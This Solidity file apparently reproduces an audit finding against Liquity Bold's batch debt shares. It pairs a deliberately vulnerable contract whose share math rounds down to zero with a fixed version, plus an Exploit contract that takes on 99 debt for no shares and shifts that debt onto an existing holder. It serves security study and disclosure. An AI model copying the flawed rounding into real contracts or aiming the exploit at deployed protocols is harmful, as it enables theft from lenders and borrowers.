// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Bold — batch share math rebases by rounding (Recon / Liquity Bold, H-01)
    SYNTHETIC, cheatcode-free, single transaction, no time warp.
    A batch with 1 share and 100 debt accepts a debt increase of 99.
    sharesDelta = 1 * 99 / 100 = 0, so the caller is minted 99 BOLD and 0
    shares. The existing share is rebased from 100 debt to 199.
    Rounding the share delta up mints 1 share and the caller owes 99. */

contract Bold {
    string public constant symbol = "BOLD";
    uint8 public constant decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BatchShares {
    Bold public bold;
    uint256 public totalDebtShares;
    uint256 public batchDebt;
    mapping(address => uint256) public sharesOf;

    constructor(address bold_) {
        bold = Bold(bold_);
        totalDebtShares = 1;
        batchDebt = 100;
        sharesOf[address(0xBEEF)] = 1;
    }

    function increaseDebt(uint256 debtIncrease) external returns (uint256 sharesDelta) {
        uint256 currentBatchDebtShares = totalDebtShares;
        uint256 _batchDebt = batchDebt;
        // @> VULN: batchDebtSharesDelta truncates, so this debt increase mints zero shares
        sharesDelta = currentBatchDebtShares * debtIncrease / _batchDebt;
        sharesOf[msg.sender] += sharesDelta;
        totalDebtShares += sharesDelta;
        batchDebt = _batchDebt + debtIncrease;
        bold.mint(msg.sender, debtIncrease);
    }

    function recordedDebt(address who) public view returns (uint256) {
        // recordedDebt = batchDebt * batchDebtShares / totalDebtShares
        return batchDebt * sharesOf[who] / totalDebtShares;
    }
}

contract BatchSharesFixed {
    Bold public bold;
    uint256 public totalDebtShares;
    uint256 public batchDebt;
    mapping(address => uint256) public sharesOf;

    constructor(address bold_) {
        bold = Bold(bold_);
        totalDebtShares = 1;
        batchDebt = 100;
        sharesOf[address(0xBEEF)] = 1;
    }

    function increaseDebt(uint256 debtIncrease) external returns (uint256 sharesDelta) {
        uint256 currentBatchDebtShares = totalDebtShares;
        uint256 _batchDebt = batchDebt;
        // FIX: round the new shares up so the debt cannot be minted for zero shares
        sharesDelta = (currentBatchDebtShares * debtIncrease + _batchDebt - 1) / _batchDebt;
        sharesOf[msg.sender] += sharesDelta;
        totalDebtShares += sharesDelta;
        batchDebt = _batchDebt + debtIncrease;
        bold.mint(msg.sender, debtIncrease);
    }

    function recordedDebt(address who) public view returns (uint256) {
        return batchDebt * sharesOf[who] / totalDebtShares;
    }
}

contract Exploit {
    uint256 public constant DEBT_IN = 99;

    Bold public bold; // CREATE nonce 1
    BatchShares public batch; // CREATE nonce 2

    uint256 public sharesMinted;
    uint256 public assetsMinted;
    uint256 public owed;
    uint256 public rebasedDebt;

    constructor() {
        bold = new Bold();
        batch = new BatchShares(address(bold));
    }

    function run() external {
        uint256 before = batch.recordedDebt(address(0xBEEF));
        sharesMinted = batch.increaseDebt(DEBT_IN);
        assetsMinted = bold.balanceOf(address(this));
        owed = batch.recordedDebt(address(this));
        rebasedDebt = batch.recordedDebt(address(0xBEEF));
        require(before == 100, "pre-rebase debt");
        require(sharesMinted == 0, "shares");
        require(assetsMinted == DEBT_IN, "assets");
        require(owed == 0, "attacker owes nothing");
        require(rebasedDebt == 199, "existing share not rebased");
        bold.transfer(msg.sender, assetsMinted);
    }
}
